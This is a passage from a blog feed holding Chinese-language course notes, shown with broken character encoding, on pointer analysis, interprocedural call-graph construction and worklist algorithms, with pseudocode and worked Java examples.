æ–°çš„work</p></li></ol><p>æ¥ç€éœ€è¦å¤„ç†å¯¹è±¡æ“ä½œï¼Œ17-18çš„è¡Œæ„æŒ‡è‹¥æŒ‡é’ˆnè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå˜é‡ï¼ˆè€Œä¸æ˜¯field)ï¼Œé‚£ä¹ˆå¯¹äºæ¯ä¸€ä¸ª Î” ä¸­çš„å¯¹è±¡å®ä¾‹ï¼Œå¤„ç†æ‰€æœ‰ä¸ $x.f$ ç›¸å…³çš„ store å’Œ load æ“ä½œï¼Œå¯¹ store å’Œ load æ“ä½œéƒ½æ˜¯ä½¿ç”¨<code>AddEdge()</code>å¤„ç†ï¼ˆ19-22è¡Œï¼‰ã€‚</p><h2 id="å…·ä½“ç¤ºä¾‹"><a href="#å…·ä½“ç¤ºä¾‹" class="headerlink" title="å…·ä½“ç¤ºä¾‹"></a>å…·ä½“ç¤ºä¾‹</h2><p>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">new</span> C();</span><br><span class="line">a = b;</span><br><span class="line">c = <span class="keyword">new</span> C();</span><br><span class="line">c.f = a;</span><br><span class="line">d = c;</span><br><span class="line">c.f = d;</span><br><span class="line">e = d.f;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç»è¿‡<code>solve():L9-12</code>çš„åˆå§‹åŒ–ï¼š</p><ul><li><p>WL=[&lt;b,{o1}&gt;, &lt;c,{o3}&gt;]</p></li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p>å¤„ç†&lt;b,{o1}&gt;: ä¸»è¦æ‰§è¡Œç¬¬16è¡Œ<code>Propagate()</code></p><ul><li><p>WL=[&lt;c,{o3}&gt;, &lt;a,{o1}&gt;]ï¼Œå› ä¸ºbâ†’aï¼Œæ‰€ä»¥å¢åŠ äº†ä¸€ä¸ªæ–°work</p></li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p>å¤„ç†&lt;c, {o3}&gt;ï¼šé™¤äº†<code>propagate(c, {o3})</code>ï¼Œæ³¨æ„åˆ°ç¬¬ 4 è¡Œå’Œç¬¬ 6 è¡Œï¼Œæ‰€ä»¥è¿˜éœ€å¤„ç†storeï¼Œå³<code>AddEdge(a,o3.f)</code>,<code>AddEdge(d,o3.f)</code>ï¼Œå› ä¸ºç›®å‰ a å’Œ d æŒ‡å‘å†…å®¹éƒ½æ˜¯ç©ºé›†ï¼Œæ‰€ä»¥ WL ä¸å¢åŠ </p><ul><li><p>WL=[&lt;a,{o1}&gt;, &lt;d,{o3}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p>å¤„ç†&lt;a,{o1}&gt;ï¼š<code>propagate(a, {o1})</code></p><ul><li><p>WL=[&lt;d,{o3}&gt;, &lt;o3.f, {o1}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p>å¤„ç†&lt;d,{o3}&gt;ï¼š<code>propagate(d, {o3})</code>, ä»¥åŠæ³¨æ„åˆ°ç¬¬ 7 è¡Œçš„ load è¯­å¥ï¼Œè°ƒç”¨<code>AddEdge(o3.f,e)</code></p><ul><li><p>WL=[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{o3}")    a-->o3.f["o3.f{}"]     d-->o3.f    o3.f --> e("e{}")</pre></li></ul><p>åé¢æ­¥éª¤çœç•¥ï¼Œæœ€å PFG ç»“æœä¸ºï¼š</p><pre class="mermaid">graph RL      b("b{o1}") --> a("a{o1}")      c("c{o3}") --> d("d{o3}")      a-->o3.f["o3.f{o1, o3}"]       d-->o3.f      o3.f --> e("e{o1, o3}")</pre><p>å¯ä»¥çœ‹åˆ° PFG ä¸­å·²ç»è®°å½•äº†æ¯ä¸ªæŒ‡é’ˆå˜é‡å¯èƒ½æŒ‡å‘çš„å¯¹è±¡ã€‚</p><h1 id="Pointer-Analysis-with-Method-Calls"><a href="#Pointer-Analysis-with-Method-Calls" class="headerlink" title="Pointer Analysis with Method Calls"></a>Pointer Analysis with Method Calls</h1><p>åœ¨åˆ†æ call statments æ—¶ï¼Œéœ€è¦åšè¿‡ç¨‹é—´åˆ†æï¼Œå³éœ€è¦æ„å»º call graphï¼Œå·²çŸ¥çš„ CHA æ„å»ºçš„ call graph æ˜¯ä¸å‡†ç¡®çš„ï¼Œæœ¬èŠ‚è¯¾ä»‹ç»å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆåˆ†ææœ¬èº«æ„å»º call graphï¼Œå³å®Œæˆè·¨å‡½æ•°çš„æŒ‡é’ˆåˆ†æã€‚</p><h2 id="Rule-Call"><a href="#Rule-Call" class="headerlink" title="Rule: Call"></a>Rule: Call</h2><p>å¯¹äºä¹‹å‰å¿½ç•¥çš„ Call stmtï¼Œæœ‰å¦‚ä¸‹æ¨å¯¼è§„åˆ™ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823202143283.png" alt="image-20200823202143283"></p><p>ä¸»è¦æœ‰4éƒ¨åˆ†ï¼š</p><ol><li>ç”± $Dispatch(o_i, k)$ è·å–ç›®æ ‡æ–¹æ³•ï¼Œ$Dispatch()$ å®ç°ä¸ä¹‹å‰ CHA åˆ†æç›¸åŒï¼š<script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script></li><li><p>è¢«$x$ æŒ‡å‘çš„å¯¹è±¡$o_i$ ï¼Œä¹Ÿè¢« $m_{this}$ æŒ‡å‘ï¼›</p></li><li><p>å¯¹äºæ¯ä¸€ä¸ªå®å‚$a_j$æ‰€æŒ‡å‘çš„ä¿¡æ¯ï¼Œä¹Ÿè¢«å½¢å‚ $m_{pj}$ æ‰€æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ  â€œå®å‚â†’å½¢å‚â€è¾¹ï¼›</p></li><li><p>å¯¹äºè¢«è¿”å›å€¼ $m_{ret}$ æŒ‡å‘çš„å¯¹è±¡$o_v$ï¼Œä¹Ÿè¢«ç­‰å·å·¦è¾¹å˜é‡ $r$ æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ â€œretâ†’râ€çš„è¾¹ã€‚</p></li></ol><p><strong>è®¨è®ºä¸ºä»€ä¹ˆå¯¹äº $m_{this}$ ä¸å¢åŠ è¾¹ï¼Œè€Œå¯¹å…¶ä»–å‚æ•°å°±å¢åŠ è¾¹ï¼š</strong></p><p>æ³¨æ„åˆ° $x$ æŒ‡å‘çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªé›†åˆï¼Œè€Œ $m_{this}$ ç”±$Dispatch()$ è§£æåå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼š</p><ol><li><p>å¯¹äºthisæ¥è¯´ï¼ŒæŒ‡é’ˆåˆ†æå·²ç»å¯ä»¥å”¯ä¸€ç¡®å®šè¯¥å¯¹è±¡å®ä¾‹ï¼Œè‹¥ä¼ é€’ $x$ çš„æŒ‡å‘å¯¹è±¡é›†åˆåè€Œé€ æˆåˆ†æä¸å‡†ç¡®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823204227690.png" alt="image-20200823204227690"></p></li><li><p>å¯¹äºå…¶ä»–å‚æ•°ï¼ŒæŒ‡é’ˆåˆ†ææ— æ³•ç¡®å®šå®ƒä»¬çš„å”¯ä¸€å¯¹è±¡å®ä¾‹ï¼Œä¸ºä¿è¯mayåˆ†æï¼Œéœ€è¦ä¼ é€’å…ˆå‰æ‰€æœ‰å¯èƒ½æ€§ï¼Œå³å¯èƒ½æŒ‡å‘çš„é›†åˆã€‚</p></li></ol><p>å½’æ ¹ç»“åº•ï¼Œthiså’Œä¸åŒå‚æ•°è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼Œthisçš„å®ä¾‹å‚ä¸äº† Dispatch è¿‡ç¨‹ã€‚</p><h2 id="Interprocedural-pointer-analysis"><a href="#Interprocedural-pointer-analysis" class="headerlink" title="Interprocedural pointer analysis"></a>Interprocedural pointer analysis</h2><ol><li>å’Œå…¶ä»–è¿‡ç¨‹é—´åˆ†æä¸€æ ·ï¼Œè¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æéœ€è¦æŒ‡å®šä¸€ä¸ªå‡½æ•°å…¥å£</li><li>è¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æä¸€è¾¹åš<strong>æŒ‡é’ˆåˆ†æ</strong>ï¼Œä¸€è¾¹æ„é€ <strong>è°ƒç”¨å›¾</strong></li><li>ç”±å…¥å£å‡ºå‘ä¸æ–­æ¢ç´¢æœªçŸ¥å‡½æ•°ï¼Œç›´åˆ°æ‰€æœ‰å¯è¢«æ¢ç´¢çš„å‡½æ•°éƒ½è¢«å¤„ç†å®Œæˆï¼Œè¿™æ ·æ—¢å¯ä»¥æé«˜æ•ˆç‡ï¼Œåˆå¯ä»¥æé«˜ç²¾åº¦</li></ol><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WL: å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFG: Pointer flow graph</span></span><br><span class="line"><span class="string">    S: å¯è¾¾æ‰€æœ‰è¯­å¥é›†åˆ s_mè¡¨ç¤ºå‡½æ•°mçš„æ‰€æœ‰è¯­å¥é›†åˆ</span></span><br><span class="line"><span class="string">    RM: å¯è¾¾æ‰€æœ‰å‡½æ•°é›†åˆ</span></span><br><span class="line"><span class="string">    CG: è°ƒç”¨å›¾ï¼Œä¿å­˜è¾¹</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line">    S = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    RM = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    CG = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">AddReachable(m) <span class="comment"># difference</span></span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br><span class="line">                ProcessCall(x, ğ‘œğ‘–) <span class="comment"># added</span></span><br></pre></td></tr></table></figure><p>ä¸å•å‡½æ•°çš„æŒ‡é’ˆåˆ†æä¸åŒï¼Œä¸»è¦å˜åŒ–åœ¨12ã€13ã€14ã€15å’Œ26è¡Œï¼Œåœ¨å‡½æ•°åˆå§‹åŒ–é˜¶æ®µï¼Œå¢åŠ å¯è¾¾è¯­å¥é›†åˆã€å¯è¾¾å‡½æ•°é›†åˆå’Œè°ƒç”¨å›¾ï¼Œä»¥åŠå¯¹ new å’Œ assign çš„å¤„ç†æ”¾åœ¨äº† <code>AddReachable()</code> å‡½æ•°ä¸­ï¼Œåœ¨å˜åŒ–çš„æ¯ä¸ªå¯¹è±¡å®ä¾‹ä¸­ï¼Œé€šè¿‡ <code>ProcessCall()</code>å¤„ç†call stmtâ€”â€”å½“nä¸ºä¸€ä¸ªå˜é‡æ—¶è°ƒç”¨ã€‚</p><h3 id="AddReachable-m"><a href="#AddReachable-m" class="headerlink" title="AddReachable(m)"></a>AddReachable(m)</h3><p><code>AddReachable(m)</code>å‡½æ•°ç”¨äºå°†æ–°çš„æ–¹æ³• $m$ åŠ å…¥å¯è¾¾é›†åˆä¸­ï¼ŒåŒæ—¶å¤„ç† $m$ ä¸­ new å’Œ assign è¯­å¥ï¼Œå¤„ç†æ–¹æ³•ä¸å•å‡½æ•°ç±»ä¼¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReachable</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM:</span><br><span class="line">        <span class="comment"># æ·»åŠ æ–°çš„å·²çŸ¥æ–¹æ³•å’Œè¯­å¥</span></span><br><span class="line">        add m to RM</span><br><span class="line">        S âˆª= S_m</span><br><span class="line">        <span class="comment"># æ›´æ–° worklist å’Œ PFG</span></span><br><span class="line">        <span class="keyword">for</span> each i: x = new T() âˆˆ S_m:</span><br><span class="line">            add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">for</span> each x = y âˆˆ S_m:</span><br><span class="line">            AddEdge(y, x)</span><br></pre></td></tr></table></figure><h3 id="ProcessCall-x-ğ‘œğ‘–"><a href="#ProcessCall-x-ğ‘œğ‘–" class="headerlink" title="ProcessCall(x, ğ‘œğ‘–)"></a>ProcessCall(x, ğ‘œğ‘–)</h3><p>$ProcessCall(x,o_i)$ ç”¨äºå¤„ç† call è¯­å¥ï¼Œç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ProcessCall</span><span class="params">(x, ğ‘œğ‘–)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> l: r = x.k(a1,â€¦,an) âˆˆ S:</span><br><span class="line">        <span class="comment"># è·å–æ–¹æ³•m</span></span><br><span class="line">        ğ‘š = Dispatch(ğ‘œğ‘–, k)</span><br><span class="line">        <span class="comment"># pass receiver object to "this"</span></span><br><span class="line">        add &lt;m_this,&#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">if</span> l â†’ m âˆ‰ CG:</span><br><span class="line">            <span class="comment"># æ„å»ºcall graph</span></span><br><span class="line">            add l â†’ m to CG</span><br><span class="line">            <span class="comment"># æ ‡è®°æ–°æ–¹æ³•ä¸ºå·²çŸ¥æ–¹æ³•</span></span><br><span class="line">            AddReachable(m)</span><br><span class="line">            <span class="comment"># ä¼ é€’æ¯ä¸ªå‚æ•°ï¼Œå»ºè¾¹</span></span><br><span class="line">            <span class="keyword">for</span> parameter ğ‘ğ‘– of m:</span><br><span class="line">                AddEdge(ğ‘ğ‘–, ğ‘ğ‘–)</span><br><span class="line">            <span class="comment"># ä¼ é€’è¿”å›å€¼</span></span><br><span class="line">            AddEdge(ğ‘š_ğ‘Ÿğ‘’ğ‘¡, r)</span><br></pre></td></tr></table></figure><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>è®¾æœ‰å¦‚ä¸‹å¾…åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        A b = <span class="keyword">new</span> B();</span><br><span class="line">        A c = b.foo(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A x)</span> </span>&#123; â€¦ &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A y)</span> </span>&#123;</span><br><span class="line">        A r = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç¨‹åºåˆå§‹åŒ–ï¼Œæœ‰å¦‚ä¸‹ç»“æœï¼š</p><ul><li><p>worklistï¼Œç”±3ã€4è¡Œçš„new stmtï¼š</p><p>WL=[&lt;a,{o3}&gt;,&lt;b,{o4}&gt;]</p></li><li><p>RMï¼Œ<code>A.main()</code>æˆä¸ºå·²çŸ¥å‡½æ•°ï¼š</p><p>RM={A.main()}</p></li><li><p>CG={}</p></li><li><p>PFGä¸ºç©ºï¼Œå› ä¸ºæ²¡æœ‰assign</p></li></ul><p><strong>è¿›å…¥å¾ªç¯ï¼Œå¤„ç† &lt;a,{o3}&gt;ï¼š</strong></p><p><code>a</code>æ²¡æœ‰storeã€loadå’Œcallï¼Œå› æ­¤åªåš<code>propagate(a,{o3})</code></p><ul><li><p>WL=[&lt;b,{o4}&gt;]</p></li><li><p>RM={A.main()}</p></li><li><p>CG={}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")</pre></li></ul><p><strong>å¤„ç† &lt;b,{o4}&gt;ï¼š</strong></p><ol><li><p>å…ˆåš<code>propagate(b,{o4})</code>;</p></li><li><p>ç”±äºç¬¬5è¡Œå­˜åœ¨è°ƒç”¨ï¼Œæ‰§è¡Œ<code>ProcessCall(b, o4)</code>ï¼Œåœ¨å‡½æ•°ä¸­ï¼Œé¦–å…ˆè§£æåˆ°è°ƒç”¨å‡½æ•°ä¸º<code>m=B.foo(A)</code>ï¼Œå°† &lt;B.foo/this. {o4}&gt; åŠ å…¥ worklist;</p></li><li><p>æ¥ç€ç”±äºä¹‹å‰æ²¡æœ‰åˆ†æè¿‡è¯¥å‡½æ•°è°ƒç”¨:</p><ol><li>å°† <code>5â†’B.foo(A)</code> åŠ å…¥CG</li></ol></li><li><p>è°ƒç”¨ <code>AddReachable()</code></p><ol><li><p>å°†<code>B.foo(A)</code>åŠ å…¥åˆ°å·²çŸ¥å‡½æ•°</p></li><li><p>æ³¨æ„åˆ°11è¡Œå­˜åœ¨newæ“ä½œï¼Œå°†{&lt;r, o11&gt;}åŠ å…¥worklist</p></li><li>è°ƒç”¨ <code>AddEdge(ai, pi)</code>ï¼Œæ›´æ–°PFG</li><li>è°ƒç”¨<code>AddEdge(r, c)</code>ï¼Œæ›´æ–°PFG</li></ol></li></ol><p>å¤„ç†ç»“æœä¸ºï¼š</p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5â†’B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")</pre></li></ul><p><strong>å¤„ç†<code>&lt;B.foo/this, {o4}&gt;</code>ï¼š</strong></p><p>åªéœ€è¦åš<code>Propagate(B.foo/this, {o4})</code></p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5â†’B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")      Bfoo("B.foo/this{o4}")</pre></li></ul><p>åç»­æ­¥éª¤ç±»ä¼¼ï¼Œæœ€åç»“æœä¸ºï¼š</p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5â†’B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{o3}")      b("b{o4}")      r("r{o11}")-->c("c{o11}")      Bfoo("B.foo/this{o4}")</pre></li></ul><h1 id="ç›¸å…³æ–‡çŒ®"><a href="#ç›¸å…³æ–‡çŒ®" class="headerlink" title="ç›¸å…³æ–‡çŒ®"></a>ç›¸å…³æ–‡çŒ®</h1><ol><li>William E. Weihl, â€œInterprocedural Data Flow Analysis in the Presence of Pointers, Procedure Variables, and Label Variablesâ€. POPL 1980.</li><li>Vini Kanvar, Uday P. Khedker, â€œHeap Abstractions for Static Analysisâ€. ACM CSUR 2016.</li><li>Lars Ole Andersen, 1994. â€œProgram Analysis and Specialization for the C Programming Languageâ€. Ph.D. Thesis. University of Copenhagen.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;CHA åªçœ‹å®šä¹‰ç±»å‹ï¼Œä¼šå¾—åˆ°å¾ˆå¤šå®é™…ä¸è¢«è°ƒç”¨çš„å­ç±»æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCHAçš„å¸¸é‡åˆ†ææ—¶åªèƒ½å¾—åˆ°NAC&lt;/p&gt;&lt;p&gt;è€ŒæŒ‡é’ˆåˆ†æä¼šå¾—åˆ°æ›´ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200818213708639.png&quot; alt=&quot;image-20200818213708639&quot;&gt;&lt;/p&gt;&lt;h1 id=&quot;Introduction-to-Pointer-Analysis&quot;&gt;&lt;a href=&quot;#Introduction-to-Pointer-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pointer Analysis&quot;&gt;&lt;/a&gt;Introduction to Pointer Analysis&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;A fundamental static analysis, computes which memory locations a pointer can point to.&lt;/p&gt;
&lt;p&gt;For object-oriented programs, computes which objects a pointer (variable or field) can point to.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="è¿‡ç¨‹é—´åˆ†æ" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/</id>
    <published>2020-08-17T12:43:13.000Z</published>
    <updated>2020-08-23T12:32:22.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>è¿‡ç¨‹å†…åˆ†æé‡åˆ°å‡½æ•°è°ƒç”¨åªèƒ½åšä¿å®ˆå‡è®¾ï¼Œå¯¼è‡´è¿‡å¤šè¯¯æŠ¥ï¼Œè€Œè¿‡ç¨‹é—´åˆ†æå¯ä»¥è·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œå› æ­¤æ›´å‡†ç¡®</p><h1 id="Call-Graph-Construction"><a href="#Call-Graph-Construction" class="headerlink" title="Call Graph Construction"></a>Call Graph Construction</h1><blockquote><p> A call graph is a set of call edges from  call-sites to their target methods (callees)</p></blockquote><a id="more"></a><p>Call Graphï¼Œç¨‹åºä¸­è°ƒç”¨è¾¹çš„é›†åˆï¼Œè°ƒç”¨è¾¹ä»è°ƒç”¨ç‚¹ï¼ˆcall-siteï¼‰å‡ºå‘åˆ°è¢«è°ƒå‡½æ•°ï¼ˆcalleeï¼‰ï¼Œè¡¨ç¤ºç¨‹åºçš„è°ƒç”¨å…³ç³»</p><h2 id="è°ƒç”¨å›¾æ„å»ºç®—æ³•"><a href="#è°ƒç”¨å›¾æ„å»ºç®—æ³•" class="headerlink" title="è°ƒç”¨å›¾æ„å»ºç®—æ³•"></a>è°ƒç”¨å›¾æ„å»ºç®—æ³•</h2><p>è°ƒç”¨å›¾æ„å»ºç®—æ³•ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><ol><li>Class hierarchy analysisï¼ˆCHAï¼‰</li><li>Rapid type analysisï¼ˆRTAï¼‰</li><li>Variable type analysisï¼ˆVTAï¼‰</li><li>Pointer analysisï¼ˆk-CFAï¼‰</li></ol><p>ç”±ä¸Šè‡³ä¸‹åˆ†æè¶Šæ¥è¶Šç²¾ç¡®ï¼Œä½†åˆ†ææˆæœ¬ä¹Ÿè¶Šæ¥è¶Šå¤§</p><h2 id="Javaè°ƒç”¨æŒ‡ä»¤"><a href="#Javaè°ƒç”¨æŒ‡ä»¤" class="headerlink" title="Javaè°ƒç”¨æŒ‡ä»¤"></a>Javaè°ƒç”¨æŒ‡ä»¤</h2><div class="table-container"><table><thead><tr><th></th><th>é™æ€è°ƒç”¨</th><th>ç‰¹æ®Šè°ƒç”¨</th><th>è™šè°ƒç”¨</th></tr></thead><tbody><tr><td>æŒ‡ä»¤</td><td>invokestatic</td><td>invokespecial</td><td>invokeinterface, invokevirtual</td></tr><tr><td>æ˜¯å¦æ¥å—å¯¹è±¡å®ä¾‹</td><td>N</td><td>Y</td><td>Y</td></tr><tr><td>è¢«è°ƒæ–¹æ³•</td><td>é™æ€æ–¹æ³•</td><td>æ„é€ 